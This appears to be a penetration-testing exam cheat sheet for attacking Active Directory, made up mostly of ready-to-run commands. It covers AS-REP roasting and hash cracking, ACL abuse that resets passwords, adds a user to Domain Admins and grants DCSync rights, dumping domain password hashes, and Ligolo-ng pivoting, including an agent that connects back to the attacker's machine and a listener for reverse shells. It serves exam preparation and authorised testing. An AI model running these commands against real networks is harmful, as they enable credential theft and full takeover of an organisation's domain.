🏛️ Active Directory

Assumed-breach: you receive creds. Start BloodHound immediately — it maps your entire kill chain. AD set = 40pts. Attack it first.

AD set is all-or-nothing for Domain Admin. Partial credit exists for early foothold steps but DA = full 40pts. Prioritize this above everything.

users, groups, shares, policy

request TGS hashes + crack

john --wordlist=/usr/share/wordlists/rockyou.txt ~/exam/loot/kerberoast.hashes

Phase 3 — AS-REP Roasting

find no-preauth accounts + crack
# With creds:
impacket-GetNPUsers <domain>/<user>:'<pass>' -dc-ip <DC_IP> -request -format hashcat -outputfile ~/exam/loot/asrep.hashes
# Without creds (need username list):
impacket-GetNPUsers <domain>/ -usersfile ~/exam/loot/users.txt -dc-ip <DC_IP> -no-pass -format hashcat -outputfile ~/exam/loot/asrep.hashes

hashcat -m 18200 ~/exam/loot/asrep.hashes /usr/share/wordlists/rockyou.txt --force

Phase 6 — ACL Abuse (from BloodHound paths)

GenericAll on user — reset password
net rpc password <targetuser> 'NewP@ss123!' -U "<domain>/<user>%<pass>" -S <DC_IP>
GenericAll on group — add self to Domain Admins
net rpc group addmem "Domain Admins" <youruser> -U "<domain>/<user>%<pass>" -S <DC_IP>
# Verify:
net rpc group members "Domain Admins" -U "<domain>/<user>%<pass>" -S <DC_IP>
WriteDACL — grant yourself DCSync rights
# PowerView on victim:
$cred = New-Object System.Management.Automation.PSCredential('<domain>\<user>', (ConvertTo-SecureString '<pass>' -AsPlainText -Force))
Add-DomainObjectAcl -TargetIdentity "<domain>" -PrincipalIdentity <youruser> -Rights DCSync -Credential $cred
# Then DCSync from kali:
impacket-secretsdump <domain>/<youruser>:'<pass>'@<DC_IP> -just-dc-ntlm

Pivoting — Ligolo-ng

full setup
# KALI — one-time interface setup:
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601

# PIVOT HOST (victim with access to internal net):
./agent -connect <KALI_IP>:11601 -ignore-cert          # Linux
.\agent.exe -connect <KALI_IP>:11601 -ignore-cert      # Windows

# In proxy console:
session   # pick session number
start     # start tunnel

# Add route on kali:
sudo ip route add 172.16.1.0/24 dev ligolo
ping 172.16.1.10   # verify tunnel works

# Expose listener for reverse shells from internal hosts:
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444
